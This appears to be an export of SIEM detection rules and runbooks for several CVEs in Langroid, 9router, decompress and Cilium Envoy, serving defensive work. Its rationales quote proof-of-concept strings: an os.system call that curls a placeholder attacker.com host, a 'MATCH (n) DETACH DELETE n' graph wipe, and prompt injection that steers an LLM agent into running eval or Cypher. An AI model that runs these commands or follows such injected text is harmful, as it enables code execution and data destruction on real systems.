Detects the Neo4j (JVM) process making unexpected outbound connections to public IPs — the SSRF / remote-fetch primitive the advisory calls out (built-in LOAD CSV remote fetch and apoc.load.* SSRF). A graph database server normally only talks to its clients and internal peers, so process-attributed egress to the internet is a strong post-exploitation signal. Rationale: Grounds on the advisory's non-contingent 'LOAD CSV remote-fetch (SSRF) primitive' and 'apoc.load.* (SSRF + remote/local file read)' — both cause the Neo4j JVM to initiate outbound fetches to attacker-chosen URLs. Scoping InitiatingProcess to the neo4j JVM and excluding RFC1918 keeps it to genuine internet egress. Sentinel empty: ASIM ImNetworkSession here carries no process attribution to bind egress to the neo4j process. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://neo4j.com/docs/cypher-manual/current/clauses/load-csv/
ATT&CKT1071.001 T1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate LOAD CSV / apoc.load.json pulling data from an approved public dataset URL
  • Neo4j calling out for license validation or update checks
  • APOC procedures fetching from a public S3/HTTP endpoint as part of a sanctioned pipeline
  • JVM telemetry/metrics agent (e.g. APM) shipping to a SaaS collector
  • Plugin auto-update reaching a public artifact repository
Suppression filter
| where not(RemoteUrl has_any ("neo4j.com","maven.org","update.neo4j"))
Response runbook
1) Triage: resolve the RemoteIP/URL and check reputation; correlate the connection time with Neo4j query.log for a LOAD CSV or apoc.load line issuing the same host (confirms SSRF). 2) Contain: block the destination egress from the DB host and disable apoc.load.* / restrict dbms.security.procedures on the server; upgrade langroid to 0.65.5. 3) Hunt: check whether the fetched content was written to disk (apoc.import/export file writes) or re-imported into the graph, and review for follow-on OS command execution from the neo4j process.
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where InitiatingProcessFileName in~ ("java.exe","javaw.exe","neo4j.exe")
| where InitiatingProcessCommandLine has_any ("neo4j","org.neo4j")
| where RemoteIPType == "Public"
| summarize FirstSeen=min(Timestamp), Conns=count(), RemoteIPs=make_set(RemoteIP,50) by DeviceName, InitiatingProcessFileName, RemotePort
| order by FirstSeen desc

| summarize FirstSeen=min(TimeGenerated), Conns=count(), RemoteIPs=make_set(RemoteIP,50) by DeviceName, InitiatingProcessFileName, RemotePort

Mass graph destruction via unbounded DETACH DELETE in Neo4j query.log AIActions on Objectives High
Detects the article's exact destructive payload — MATCH (n) DETACH DELETE n and other DETACH DELETE statements lacking a WHERE clause — in Neo4j query.log. This is the 'full write/destroy' impact primitive available with no extra config once an attacker steers the CypherCreationTool. Rationale: Matches the advisory's literal destruction example 'MATCH (n) DETACH DELETE n' (also the statement the built-in remove_database helper runs) and generalizes to any DETACH DELETE lacking a WHERE bound — the exact shape that wipes the entire graph. Excluding WHERE separates a targeted maintenance delete from an attacker-steered mass wipe. Endpoint-EDR platforms empty: this lives only in Neo4j's own query log. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://www.thehackerwire.com/langroid-sqlchatagent-rce-via-prompt-injection-cve-2026-25879/
ATT&CKT1485
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • DBA running a full graph reset in a dev/test database during a rebuild
  • Scheduled teardown of a transient staging graph before reload
  • Langroid's own remove_database helper invoked intentionally during cleanup
  • Data-migration script clearing a namespace before re-import
  • Test-suite fixtures that wipe the graph between runs
Suppression filter
| where SyslogMessage !has_any ("test","staging","scratch") and ProcessName has "neo4j"
Response runbook
1) Triage: confirm the target database (prod vs disposable), the auth principal, and whether a bolt session tied to the Langroid service account issued it; snapshot transaction logs before they roll. 2) Contain: if prod and attacker-attributed, isolate the Neo4j instance, halt the Langroid agent, and initiate restore from the last backup/transaction-log point-in-time. 3) Hunt: search query.log around the event for preceding apoc.export (staging exfil before wipe) and for the injecting prompt (UC 'Cypher injection primitives in prompt input').
Syslog
| where TimeGenerated > ago(24h)
| where SyslogMessage has "DETACH DELETE"
| where SyslogMessage !has "WHERE"     // unbounded MATCH (n) DETACH DELETE n-style mass wipe
| project TimeGenerated, Computer, HostName, ProcessName, SyslogMessage
| order by TimeGenerated desc

Langroid Neo4jChatAgent launched with allow_dangerous_operations enabled AIInstallation Low
Hunts hosts where a Langroid Neo4jChatAgent process/config sets allow_dangerous_operations to true — the config gate added in the 0.65.5 fix that re-enables unvalidated, write/apoc-capable Cypher. Flags the 'config-conditional RCE' posture the advisory title warns about, plus vulnerable langroid installs (<=0.65.4). Rationale: Anchors on the exact config gate named in the maintainer resolution ('a new allow_dangerous_operations config gate, default False') plus the affected identifiers (Neo4jChatAgent, langroid <=0.65.4). Detecting it set True marks the RCE-capable posture. Low confidence because Python config objects/YAML aren't always surfaced on the process command line; pair with a config-file inventory sweep for allow_dangerous_operations in Langroid deployments. Sigma skipped (no reliable single standard logsource across the three telemetry shapes). Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://www.thehackerwire.com/langroid-sqlchatagent-rce-via-prompt-injection-cve-2026-25879/

Recon scanning of 9router unauthenticated /api/* endpoints from single source AIReconnaissance Medium
Hunts a single client sweeping the article's named unauthenticated 9router API paths (/api/providers, /api/usage/stats, /api/usage/request-logs, /api/usage/request-details, /api/models, /api/version) within a short window — the discovery step before an attacker exploits the missing-auth CRUD and key-leak endpoints. Article-specific because the endpoint set is exactly the one enumerated in GHSA-vjc7-jrh9-9j86. Rationale: Uses the exact unauthenticated endpoint set enumerated in GHSA-vjc7-jrh9-9j86 (/api/providers, /api/usage/stats, /api/usage/request-logs, /api/usage/request-details, /api/models, /api/version); a single src hitting 6+ of them in 5 minutes is scanning, not a legit SPA which only pulls the specific ones it renders. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431 • https://advisories.gitlab.com/npm/9router/GHSA-g6g7-pvmx-m74p/
ATT&CKT1595.002 T1046
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Authenticated admin loading the 9router dashboard which legitimately fans out to /api/providers + /api/models + /api/version on page load
  • Internal uptime/health monitor polling several /api/* endpoints
  • Security scanner (Nessus/Burp) run by the org's own AppSec team during authorized testing
  • CI smoke test hitting multiple API routes post-deploy
Suppression filter
| where SrcIpAddr !in ("10.0.0.0/8 internal-monitor-ranges")  // replace with your health-check / AppSec scanner source IPs once identified
Response runbook
1) Triage: pull all requests from the offending SrcIpAddr in the window; is it an internal admin/monitor IP or external/unknown? Check whether requests carried a session cookie/Authorization header (unauthenticated = no creds). 2) Contain: block the source IP at the WAF/reverse proxy and put /api/providers and /api/usage/* behind auth or a network ACL; confirm the 9router instance is upgraded to >=0.4.45. 3) Hunt: pivot the same src to the mutation and key-leak UCs below — look for follow-on POST/PUT/DELETE /api/providers and GET /api/usage/stats returning 200.

Unauthenticated 9router provider CRUD mutation (rogue-provider / key-swap / DoS) AIActions on Objectives High
Hunts POST/PUT/DELETE requests to /api/providers or /api/providers/:id — the missing-auth mutation path that lets any client inject an attacker-controlled provider (proxying prompts/keys), overwrite an existing provider's API key, or delete all providers for denial of service. Article-specific to the CRUD endpoints in GHSA-vjc7-jrh9-9j86 which require zero authentication. Rationale: POST/PUT/DELETE to /api/providers is a direct match for the missing-auth CRUD in the advisory; because the endpoint requires no auth, ANY mutation from an unexpected source is high-fidelity (inject rogue provider with attacker apiKey, swap sk-* key, or delete for DoS). Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431 • https://advisories.gitlab.com/npm/9router/GHSA-g6g7-pvmx-m74p/
ATT&CKT1565.001 T1098.003
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin adding/editing/removing a provider connection via the dashboard UI (which calls the same routes)
  • Automated provisioning/IaC script that seeds provider configs on deploy
  • Internal migration job re-writing provider entries during an upgrade to 0.4.45
Suppression filter
| where HttpMethod == "DELETE" or SrcIpAddr !in ("<known-admin-workstation-IPs>")  // start with DELETE (never a benign bulk op) then add admin-source allowlist
Response runbook
1) Triage: inspect the request body/UA and source IP — was there a preceding authenticated dashboard session from the same client, or is it a raw curl/unknown UA? DELETE with no prior admin login = malicious. Pull the created/modified provider's name and apiKey prefix from app logs. 2) Contain: revoke/rotate any provider API keys that could have been swapped or exfiltrated, remove attacker-injected provider entries, block the source, and gate /api/providers/* behind auth; upgrade to >=0.4.45. 3) Hunt: check /api/usage/stats reads (key leak) from the same src, and outbound traffic from the 9router host to any newly-added provider endpoint (prompt/response proxying).
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath startswith "/api/providers"
| where HttpMethod in ("POST","PUT","DELETE")
| extend Status = toint(HttpStatusCode)
| project TimeGenerated, SrcIpAddr, HttpHostName, HttpMethod, UrlPath, Status, HttpRequestBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router API-key leak via unauthenticated GET /api/usage/stats and /api/usage/request-logs AIActions on Objectives High
Hunts successful GET requests to /api/usage/stats (returns full plaintext sk- API keys, per-account cost data) and /api/usage/request-logs (all users' request history incl. emails) — the unauthenticated credential-exposure endpoints in the advisory. Any 200 here means secrets were served without auth. Rationale: /api/usage/stats returning 200 literally serves plaintext sk- keys and per-key cost data per the advisory, and /api/usage/request-logs serves all users' history with emails — both are named unauthenticated endpoints, so a successful GET is a confirmed secret disclosure, not just an attempt. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1528 T1552.001
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin opening the 9router usage/billing dashboard which fetches these endpoints
  • Internal billing/reporting exporter scraping usage stats on a schedule
  • Monitoring probe validating the endpoint is up
Suppression filter
| where SrcIpAddr !in ("<admin-and-billing-exporter-IPs>")
Response runbook
1) Triage: identify SrcIpAddr and whether the request was authenticated; if external/unknown, treat every sk- key and OAuth token stored in that 9router instance as compromised. Correlate response byte-size — larger bodies = full key dump. 2) Contain: immediately rotate ALL provider API keys (OpenAI sk-, GitHub Copilot OAuth tokens, Cloudflare account creds) referenced by the instance, block the source, gate /api/usage/* behind auth, upgrade to >=0.4.45. 3) Hunt: search external AI-provider billing/usage for anomalous calls using the leaked keys; check for concurrent /api/usage/request-details enumeration (conversation exfil) from the same src.
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath in ("/api/usage/stats","/api/usage/request-logs")
| where HttpMethod == "GET"
| extend Status = toint(HttpStatusCode)
| where Status == 200
| project TimeGenerated, SrcIpAddr, HttpHostName, UrlPath, Status, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Bulk enumeration of 9router /api/usage/request-details (conversation-history exfiltration) AIActions on Objectives Medium
Hunts a single source sequentially pulling many distinct /api/usage/request-details/:id records — each returns another user's full conversation (system prompts, user/assistant messages, tool calls, reasoning traces) with no auth. High distinct-UUID count or large cumulative response volume from one src indicates mass conversation exfiltration. Rationale: /api/usage/request-details/:id returns full cross-user conversation contents per the advisory; a single src pulling 25+ distinct request UUIDs (200 responses) in 30 minutes is enumeration/exfil of other users' sessions, distinguishable from a user reviewing their own handful of requests. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1530 T1213
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin auditing usage by opening many request details in the dashboard
  • Internal data-export/backup job iterating request records
  • Analytics pipeline reading conversation records for QA
  • Load/soak test replaying many request-detail IDs
Suppression filter
| where SrcIpAddr !in ("<admin-and-export-job-IPs>")
Response runbook
1) Triage: confirm the source is unauthenticated/external and count distinct UUIDs + total bytes served — high both = full conversation-store dump. Sample which conversations were pulled (any containing embedded secrets in prompts?). 2) Contain: block the source, gate /api/usage/request-details behind auth, upgrade to >=0.4.45; notify data-owner/DPO as user prompt/response content (potentially PII/secrets) was disclosed. 3) Hunt: correlate the same src with /api/usage/stats (key leak) and /api/providers mutation; review any secrets/tokens that appeared inside leaked prompts and rotate them.

Langroid Python agent spawning shell/downloader child (os.system RCE) AIExploitation Medium
Hunts a Python interpreter (the Langroid TableChatAgent/VectorStore process) spawning a shell or download utility, the observable footprint of CVE-2026-54769 where eval'd LLM output calls __import__('os').system(). An interactive LLM-agent host forking /bin/sh -c to run curl/wget/touch is abnormal and matches the PoC exactly. Rationale: Anchored on the PoC os.system() behavior: __import__('os').system('touch /tmp/rce_success_table') forks /bin/sh -c under the python Langroid process. Cross-checked GHSA-q9p7-wqxg-mrhc, GitLab advisory (fix 0.65.2), and Langroid mitigation commit 0d9e4a7. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://github.com/langroid/langroid/commit/0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6
ATT&CKT1059.006 T1059.004 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Langroid/pandas workflows that shell out via subprocess for data prep
  • Python-based CI/build agents invoking curl/wget to fetch artifacts
  • MLOps notebooks running !touch/!chmod cell magics that fork a shell
  • Application deployment scripts written in Python that call system utilities
  • Python package post-install hooks invoking chmod on installed binaries
Suppression filter
| where not (ProcessCommandLine has_any ("apt-get","pip install","/opt/ci/","jenkins","gitlab-runner"))
Response runbook
1) Triage: pull the parent python command line and the child shell command line — confirm whether the child runs curl/wget to an external host or writes to /tmp (matches PoC marker /tmp/rce_success_table). Identify the Langroid app and whether full_eval=True is set. 2) Contain: isolate the host, kill the python agent process, and block the outbound destination the child contacted; rotate any API keys/DB creds accessible to the agent process. 3) Hunt: pivot on the same host for follow-on shells, new persistence, and outbound connections; sweep the fleet for langroid <= 0.65.1 and other agents with the same parent-python-spawns-shell pattern.

Outbound egress from shell/downloader child of a Python (Langroid) process AICommand & Control Medium
Hunts external network connections initiated by curl/wget/sh whose parent is a Python interpreter — the payload-retrieval / C2 leg of CVE-2026-54769 (the PoC uses os.system('curl http://.../pwned')). Pairs the LOLBin-egress shape with the specific python-parent context so it fires on agent-host compromise, not generic internet use. Rationale: PoC exfil/retrieval leg os.system('curl http://attacker.com/pwned') produces a curl/wget child of python reaching a public IP; attacker.com is an illustrative placeholder so the query pivots on the process-parentage + public-destination shape, not the domain. Sentinel left blank: ASIM network tables in this tenant don't carry Linux parent-process context to express the pivot cleanly. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/

Langroid eval() exploit signature: __import__('os') / full_eval=True in cmdline or app logs AIExploitation High
Alerts on the literal CVE-2026-54769 exploit and dangerous-config strings — __import__('os').system(, pandas_eval expressions, and full_eval=True — appearing in Linux process command lines or application/syslog output. Catches both the risky enabling config and the injected payload as it is logged by the pandas_eval tool, before/independent of process-tree spawn. Rationale: Uses the exact article strings: the payload prefix __import__('os').system(, the vulnerable pandas_eval tool name, the TableChatAgent class, and the gating full_eval=True config. These are high-fidelity and near-zero in benign traffic. Corroborated by GitLab advisory and Langroid fix commit 0d9e4a7 (patched 0.65.2). Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://github.com/langroid/langroid/commit/0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6
ATT&CKT1203 T1059.006 T1027
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers/red-team running the published PoC in a lab
  • Langroid developers legitimately configuring full_eval=True in a trusted-input scenario
  • Unit tests or documentation examples that reference pandas_eval / TableChatAgent
  • A WAF/proxy log echoing a blocked prompt that contained __import__('os')
  • Vulnerability-scanner payloads probing for CVE-2026-54769
Response runbook
1) Triage: determine whether the string is a config (full_eval=True — risky posture) or an active payload (__import__('os') — likely exploitation). For payloads, extract the command inside os.system() and check for follow-on shell/network activity (UC1/UC2). 2) Contain: if a payload executed, isolate the host and kill the agent; if it is only config, flag the app owner to disable full_eval and upgrade langroid to >= 0.65.2. 3) Hunt: search all app/syslog for other injected expressions from the same source/user, and inventory every langroid deployment with full_eval enabled.

| project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc

| where SyslogMessage has_any ("__import__('os')", "full_eval=True", "pandas_eval", "TableChatAgent")

Vulnerable Langroid package (<= 0.65.1) present on managed hosts AIExploitation High
Surfaces hosts running a Langroid version affected by CVE-2026-54769 (pip:langroid <= 0.65.1; fixed in 0.65.2) via Defender TVM. Direct exposure-management pivot so the SOC can prioritize hardening/upgrade of any host that could serve the TableChatAgent/VectorStore eval() RCE. Rationale: Grounded on the article's affected range 'pip:langroid (vuln <= 0.65.1)' and web-confirmed fix version 0.65.2 (GitLab advisory). Vulnerable @xhmikosr/decompress or decompress package present (CVE-2026-53486) AIWeaponization High
Inventory hunt that surfaces hosts carrying a decompress version affected by CVE-2026-53486 (@xhmikosr/decompress < 10.2.1, >= 11.0.0 < 11.1.3, or unmaintained decompress <= 4.2.1). These hosts can be pushed a crafted archive that writes/reads files outside the extraction directory, so they are the exposure baseline for the runtime detections below. Rationale: Keys off the exact CVE id CVE-2026-53486 from the advisory; TVM already tracks the fixed versions (10.2.1 / 11.1.3) so this is a clean deploy-blast-radius hunt rather than a behavioural one. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/ • https://vulert.com/vuln-db/CVE-2026-53486
ATT&CKT1195.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Package present but pinned behind a build stage that never extracts untrusted archives (dev-only devDependency)
  • Transitive copy already deduped to a fixed version at runtime while the tree still lists the vulnerable range
  • Container image layer cached with the old version but overridden at runtime
  • Air-gapped host that only ever extracts internally-produced archives
  • SBOM lists the package but the code path is dead / behind a disabled feature flag
Response runbook
Step 1 (triage): confirm the resolved runtime version (npm ls @xhmikosr/decompress / decompress) — a lockfile range is not the installed version. Step 2 (contain): for any host that extracts network-sourced archives, bump to @xhmikosr/decompress 11.1.3 (or 10.2.1) and, as interim mitigation, run extraction as a non-root user. Step 3 (hunt): pivot to the runtime UCs below on the same DeviceName to check whether an escape has already been attempted (symlink/hardlink creation, writes to /etc/cron.d, /etc/ld.so.preload, ~/.ssh/authorized_keys).

| project DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

Node archive-extraction process writing to Linux persistence paths (decompress dir-escape) AIInstallation Medium
Hunts a Node.js process (the runtime that hosts the vulnerable decompress library) creating or modifying files under canonical persistence locations — cron drop-dirs, systemd unit dirs, sudoers.d, and SSH authorized_keys. CVE-2026-53486 lets a crafted archive escape the extraction root and land an entry anywhere the process can write; these directories are the highest-value landing zones and none are ever a legitimate output target for archive extraction. Rationale: Article states a crafted entry can be written 'outside that directory'; a node process (the decompress host) writing into cron/systemd/sudoers/authorized_keys is never a legitimate extraction target, so the destination path itself is the escape signal. Persistence paths are the MITRE-canonical landing zones for a write-anywhere primitive, not verbatim advisory strings — flagged as hunting for that reason. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9
ATT&CKT1053.003 T1098.004 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node-based config-management/IaC agent (e.g. a homegrown deployer) that legitimately writes systemd units
  • Node process management tools like pm2 generating a systemd unit via 'pm2 startup'
  • A CI runner written in Node that provisions cron jobs as part of a build
  • Cloud-init or provisioning scripts that shell out to node to template a sudoers.d fragment
  • Developer tooling that writes ~/.ssh/authorized_keys during a workstation bootstrap
Suppression filter
| where InitiatingProcessCommandLine !has "pm2" and InitiatingProcessCommandLine !has_any ("startup","deploy")
Response runbook
Step 1 (triage): pull the InitiatingProcessCommandLine and parent chain — a legitimate extraction targets an app/tmp dir, not /etc; confirm whether an archive was fetched over the network moments before (correlate FileCreated of a .tar/.zip in a temp dir by the same node PID). Step 2 (contain): quarantine/rollback the written file (cron/unit/authorized_keys), kill the node process, and revoke any SSH key added. Step 3 (hunt): sweep the host for the symlink/hardlink escape UC and for setuid/ld.so.preload writes; check for outbound C2 from any cron/systemd payload just dropped.

| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where (FolderPath has_any ("/etc/cron.d","/etc/cron.hourly","/etc/cron.daily","/etc/cron.weekly","/etc/systemd/system","/usr/lib/systemd/system","/etc/sudoers.d")
        or (FileName =~ "authorized_keys" and FolderPath has "/.ssh"))
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","cloud-init","ansible")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","nodejs")
| where TargetFilePath has_any ("/etc/cron.d","/etc/cron.hourly","/etc/cron.daily","/etc/cron.weekly","/etc/systemd/system","/usr/lib/systemd/system","/etc/sudoers.d","/.ssh/authorized_keys")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, DvcAction, TargetFilePath
| order by TimeGenerated desc

Node extraction writing ld.so.preload or setuid/privileged path as root (CVE-2026-53486 privesc) AIInstallation High
Alerts when a Node.js process running as root writes /etc/ld.so.preload or drops into privileged binary dirs (/usr/local/sbin, /usr/local/bin) during archive extraction. CVE-2026-53486 applies file modes with 'mode & ~umask', preserving setuid/setgid bits, and lets entries escape the output dir — so a root-context extraction can plant a preloaded library or a setuid binary for privilege escalation. This is near-zero in normal operation. Rationale: Anchored to the advisory's mode-bit finding ('File modes were applied as mode & ~umask ... does not remove the setuid, setgid, or sticky bits ... matters when extraction runs as root'). ld.so.preload and setuid drops into /usr/local/s?bin are the canonical root-write privesc targets for that primitive; keyed on InitiatingProcessAccountName==root to keep FP near zero. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/
ATT&CKT1548.001 T1574.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A root-run Node build tool legitimately installing a native addon into /usr/local/bin
  • node-gyp / install scripts placing compiled helpers under /usr/local during a package build
  • In-house deployment tooling written in Node that manages ld.so.conf.d for custom libs
  • Container entrypoint (running as root) that node-templates a binary into /usr/local/bin
  • Monitoring/APM agent installers shelling through node to drop a preload shim
Suppression filter
| where InitiatingProcessCommandLine !has "node-gyp" and InitiatingProcessCommandLine !has_any ("install","rebuild","prebuild")
Response runbook
Step 1 (triage): inspect the written file — dump /etc/ld.so.preload contents or stat the /usr/local binary for setuid/setgid bits; confirm no legitimate root-run build (node-gyp, npm install of a native module) explains it. Step 2 (contain): isolate the host, remove the preload entry / setuid binary, and rotate any credentials reachable from root on that box; if in a container, kill and rebuild from a patched image (decompress >= 11.1.3). Step 3 (hunt): review process executions immediately after the write for any binary that loaded the preloaded library or ran with elevated tokens, and check the same host for the symlink-escape and persistence-path UCs.
DeviceFileEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where InitiatingProcessAccountName =~ "root"
| where FolderPath has "/etc/ld.so.preload" or FileName =~ "ld.so.preload"
      or FolderPath has_any ("/usr/local/sbin","/usr/local/bin","/etc/ld.so.conf.d")
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","make","cloud-init")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","nodejs")
| where ActorUsername =~ "root"
| where TargetFilePath has_any ("/etc/ld.so.preload","/etc/ld.so.conf.d","/usr/local/sbin/","/usr/local/bin/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, DvcAction, TargetFilePath
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: TLS secret / config disclosure via admin.sock (CVE-2026-49445) AIActions on Objectives Medium
Hunts a local process on a Kubernetes node reading sensitive Envoy admin endpoints (/certs, /config_dump, /clusters) over the world-accessible Cilium Envoy admin.sock. Only cilium-agent/cilium-envoy should ever touch this socket, so any curl/wget/socat/python/nc process referencing it plus a read endpoint is anomalous and indicates exploitation of the mode-0777 socket. Rationale: Anchored on the concrete artifacts corroboration surfaced: the world-accessible socket is admin.sock (mode fixed to 0660 in PR #44512) and the article's 'Exposing TLS secrets' maps precisely to Envoy's /certs and /config_dump admin endpoints (Envoy admin docs). Excluding cilium-* binaries makes non-cilium access to this socket high-fidelity. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1552.001 T1005 T1613
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Cilium/Isovalent support engineer running `cilium-sysdump` or manual curl against admin.sock during troubleshooting
  • Custom Prometheus exporter or monitoring wrapper script scraping /stats or /config_dump for observability
  • Platform team debugging L7 policy by dumping Envoy config on a node
  • CI/e2e test harness that exercises the admin interface
  • SRE gathering diagnostics via a non-cilium helper script that shells out to curl
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-health", "cilium-bugtool"))
Response runbook
1) TRIAGE: Identify the acting process, its parent, and the user/UID. Confirm it is NOT cilium-agent/cilium-envoy and not a sanctioned sysdump/monitoring job. Capture which endpoint was hit — /certs and /config_dump mean TLS material and full mesh config may be disclosed. 2) CONTAIN: Isolate the node, rotate any TLS secrets/SDS certs served by Envoy on that node, and confirm Cilium is upgraded to a patched build (v1.17.14 / v1.18.8 / v1.19.2) so admin.sock is mode 0660. 3) HUNT: Pivot on the same host/UID for other admin.sock access, for destructive endpoint hits (/quitquitquit, /drain_listeners), for lateral movement from the identity, and search other nodes for the same process ancestry.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: destructive DoS via /quitquitquit /drain_listeners (CVE-2026-49445) AIActions on Objectives High
Alerts when a local process invokes disruptive Envoy admin operations over the world-accessible Cilium admin.sock — /quitquitquit (terminate Envoy), /drain_listeners, /healthcheck/fail, /reset_counters. These directly implement the article's 'disrupting traffic' and 'terminating the Envoy process' impacts and have no legitimate manual use against the Cilium-managed Envoy. Rationale: The article explicitly lists 'Disrupting traffic in the cluster' and 'Terminating the Envoy process' as impacts; Envoy admin docs confirm /quitquitquit terminates the process and /drain_listeners + /healthcheck/fail disrupt serving. These are irreversible operational actions no legitimate operator issues against the Cilium-managed Envoy, making this alertable at high confidence. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1489 T1499
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator manually draining a node for maintenance who scripts /drain_listeners against the Cilium Envoy instead of using the node-drain workflow
  • Chaos-engineering / resilience test intentionally failing Envoy healthchecks
  • Support engineer restarting a wedged Envoy via /quitquitquit during an incident
  • Custom automation that resets Envoy stat counters via /reset_counters before a benchmark
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-bugtool"))
Response runbook
1) TRIAGE: Correlate the process/user/UID with any approved change or maintenance window; check whether Envoy on the node restarted or dropped L7 traffic immediately after (cilium-agent logs, pod readiness flaps). 2) CONTAIN: Cordon/isolate the node, restore Envoy (cilium-agent will respawn it) and verify L7 policy enforcement resumed, then ensure the cluster is upgraded to a patched Cilium (v1.17.14 / v1.18.8 / v1.19.2). 3) HUNT: Look for prior read abuse of the same admin.sock (/certs, /config_dump) from the same identity, repeated destructive calls across multiple nodes (coordinated DoS), and the initial access vector that placed the attacker on the node.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
